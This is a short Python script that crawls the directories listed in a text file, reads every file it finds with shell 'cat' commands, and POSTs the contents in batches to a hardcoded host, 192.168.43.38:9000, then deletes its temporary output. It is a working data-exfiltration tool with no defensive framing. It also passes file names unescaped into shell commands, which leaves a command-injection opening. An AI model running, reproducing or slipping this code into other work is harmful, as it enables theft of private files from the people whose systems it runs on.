import subprocess
import os
import time
import requests


def run_command(command):

    command = command.rstrip()
    
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = "Failed to execute command " + str(e)
    return output

def POST_response(response):
    global base_url
    os.chdir(base_url)
    try:
        file_object = open("directory_response.txt", "w")
        file_object.write(response)
        file_object.close()

        file_object = open("directory_response.txt", "r+")
        data = file_object.readlines()
        file_object.close()
        formatted_response = ""
        for line in data:
            formatted_response += line + " SPLIT "
        time.sleep(30)
        url = 'http://192.168.43.38:9000'
        response = requests.post(url, data=formatted_response)  
        COMMAND = "rm directory_response.txt"
        run_command(COMMAND)
    except Exception as e:
        pass


def enlist_directory(directory_name):
    global directory_list
    global base_url
    directory_name = directory_name.rstrip()
    os.chdir(directory_name)
    response = ""
    files = []
    directory_contents = os.listdir(directory_name)
    response = response + "-" + directory_name + "\n"
    for content in directory_contents:
        content_path = os.path.relpath(content)
        if(os.path.isfile(content_path)):
            response = response + "--FILE: " + content + "\n"
            files.append(content_path)
        elif(os.path.isdir(content_path)):
            response = response + "--DIR: " + content + "\n"
            directory_list.append(os.path.abspath(content_path))
    for filepath in files:
        try:
            output = run_command("cat \'" + filepath + "\'")
            response = response + "Contents of " + filepath + "\n\n"
            try:
                output = output.decode('utf-8')
            except:
                pass
            response = response + str(output) + "\n"
            response = response + "--------------------\n"
        except Exception as e:
            response = response + str(e) + "\n"
            response = response + "--------------------\n"
            continue

    return response 

file_object = open("directory.txt", "r")
directory_list = file_object.readlines()
file_object.close()
base_url = os.getcwd()
while(len(directory_list) > 0):
    directory_name = directory_list[0]
    response = ""
    response += enlist_directory(directory_name) + "\n -------------- END --------------------- \n"
    POST_response(response)
    directory_list.remove(directory_name)
    